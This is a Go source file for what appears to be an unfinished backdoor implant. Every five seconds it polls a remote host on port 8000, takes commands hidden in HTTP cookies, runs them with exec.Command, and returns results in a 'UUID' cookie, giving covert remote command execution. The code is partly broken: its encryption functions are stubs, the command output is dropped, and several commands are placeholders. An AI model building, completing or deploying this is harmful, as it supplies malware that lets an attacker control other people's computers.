package main

import (
	"fmt"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

const (
	EXEC byte = 0x1
)

func serverWorker(clientIp string) {

	fmt.Printf("Got connection from %v\n", clientIp)

	results := make(chan string)

	client := &http.Client{}

	//resp, err := client.Get(clientIp.String())

	ticker := time.NewTicker(time.Second * 5)
	for _ = range ticker.C {

		//read from the response buffer
		request, err := http.NewRequest("GET", "http://"+clientIp+":8000", nil)
		if err != nil {
			panic(err)
		}

		request.Close = true

		// use select to avoid infinetly blocking on <-results
		select {
		case resultData, ok := <-results:

			if !ok {
				return
			}
			var myCookie http.Cookie
			myCookie.Name = "UUID"
			myCookie.Value = resultData
			myCookie.MaxAge = 15
			myCookie.Secure = false
			myCookie.HttpOnly = false

			//encode data into a response cookie

			request.AddCookie(&myCookie)
			fmt.Printf("Adding cookie: \"%v\"\n", resultData)
		default:
		}

		//send http request to "server"
		response, err := client.Do(request)
		if err != nil {
			fmt.Println(err.Error())
			return
		}

		//get response
		cookies := response.Cookies()
		//see if there is a command within the cookie returned
		if len(cookies) == 0 {
			continue
		}
		//if cookie, exec a command worker with said command

		for _, setCookie := range cookies {
			go runCommand(setCookie.Value, results)
		}

	}
}

func runCommand(data string, results chan<- string) {

	command := decrypt(data)

	switch command[0] {
	case EXEC:
		// get sequence number
		seq := command[1]

		// cast data section into chuncks of strings
		commandParts := strings.Split(string(command[2:]), " ")

		// create exec
		cmd := exec.Command(commandParts[1], commandParts[2:]...)

		// run exec and get output
		output, err := cmd.CombinedOutput()
		if err != nil {
			return
		}

		// prepare a buffer for encoding the output
		result := make([]byte, 0, len(output)+2)
		result = append(result, 1, seq)
		results <- encrypt(result)

	}

	//chdir

	//watch

	//getFile

}

func encrypt(data []byte) string {
	return string(data)
}

func decrypt(data string) []byte {
	return []byte(data)
}
